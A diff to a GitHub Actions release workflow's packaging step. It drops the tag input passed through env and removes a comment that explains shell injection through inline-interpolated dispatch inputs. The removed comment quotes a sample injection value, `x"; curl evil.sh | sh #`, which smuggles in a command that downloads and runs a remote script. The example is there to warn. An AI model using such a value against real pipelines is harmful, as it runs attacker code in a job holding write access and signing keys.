@@ -233,20 +233,11 @@ jobs:
           } > "$OUT"
           echo "wrote $OUT ($(wc -l < "$OUT") lines)"
 
-      # INPUT_TAG goes through env, never interpolated into the script body.
-      # `${{ github.event.inputs.tag }}` written inline is substituted before bash
-      # sees it, so a dispatch input like `x"; curl evil.sh | sh #` executes — in
-      # a job holding contents:write and the signing key. Via env it is only ever
-      # a shell variable's value.
       - name: Package
         shell: bash
-        env:
-          INPUT_TAG: ${{ github.event.inputs.tag }}
         run: |
           set -euo pipefail
-          # Explicit input wins. On workflow_dispatch GITHUB_REF_NAME is the
-          # *branch* ("development"), not a tag, so preferring it would name
-          # every dispatched artifact after the branch.
+          # The generated identity names releases; previews use the exact source SHA.
           VERSION="$ARTIFACT_VERSION"
           mkdir -p dist
 
